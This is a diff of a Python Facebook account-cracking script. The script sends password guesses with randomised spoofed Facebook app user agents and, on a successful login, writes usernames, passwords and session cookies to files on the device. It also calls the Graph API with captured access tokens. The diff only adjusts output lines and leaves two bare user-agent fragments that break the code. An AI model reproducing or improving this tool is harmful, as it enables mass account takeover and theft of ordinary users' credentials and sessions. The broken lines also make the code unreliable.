@@ -127,8 +127,8 @@ for xd in range(5000):
     application_version = str(random.randint(111,396))+'.0.0.'+str(random.randrange(10,49))+'.'+str(random.randint(111,396))
     V=str(random.randrange(11,99))
     uaku2=f'{aa} {bv}; {c}{d}{e}{f} Build/{d}{f}{V}{f}; wv) {g}{h}.{i}.{j}.{k} {l} [FBAN/EMA;FBLC/en_US;FBAV/{application_version};]'
-    #[FBAN/EMA;FBLC/en_US;FBAV/331.0.0.9.105;]'
-    #[FB_IAB/FB4A;FBAV/127.0.0.22.69;]'
+    [FBAN/EMA;FBLC/en_US;FBAV/331.0.0.9.105;]'
+    [FB_IAB/FB4A;FBAV/127.0.0.22.69;]'
     ugen.append(uaku2)
 
 for xd in range(5000):
@@ -654,7 +654,8 @@ class crack:
                 if "c_user" in str(cok):
                     coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                     user=cok['c_user']
-                    print(f"\r{HH}[OK-GSXD] {user} | {pw} | {coki}		 {VV}			    ")
+                    print(f"\r{HH}[OK-GSXD] {user} | {pw} {VV} ")
+                    #print(f"\r{HH}#[OK-GSXD] {user} | {pw} | {coki}		 {VV}			    ")
                     open("/sdcard/GSXD_OK.txt", "a").write(user + "|" + pw + "\n")
                     open("/sdcard/GSXD_cokie.txt", "a").write(user + "|" + pw + " | " + coki + "\n")
                     ok.append(user + pw)
@@ -698,7 +699,7 @@ class crack:
                 b=str(random.choice(string.ascii_uppercase))
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
-                #ua_string = 'SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+gtt+' Build/'+gttt+') [FBAN/EMA;UNITY_PACKAGE/1549;FBBV/'+application_version_code+';FBAV/'+application_version+';FBDV/'+gtt+';FBLC/vi_VN;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]'
+                ua_string = 'SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+gtt+' Build/'+gttt+') [FBAN/EMA;UNITY_PACKAGE/1549;FBBV/'+application_version_code+';FBAV/'+application_version+';FBDV/'+gtt+';FBLC/vi_VN;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]'
                 data = {
                     'locale':'en-US',
                     'client_country_code':'US',
@@ -907,7 +908,8 @@ class crack:
                         me=requests.get('https://graph.facebook.com/me?access_token='+tokic, cookies={'cookie':cokie}).json()
                         name=me['name']
                         idd=me['id']
-                        print(f"\r{HH}[OK-GSXD] {used} | {pw} | {cokie} {VV} 			   ")
+                        print(f"\r{HH}[OK-GSXD] {used} | {pw}  ")
+                        #print(f"\r{HH}[#OK-GSXD] {used} | {pw} | {cokie} {VV} 			   ")
                         open("/sdcard/GSXD_OK.txt", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GSXD_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                         ok.append(used + pw)
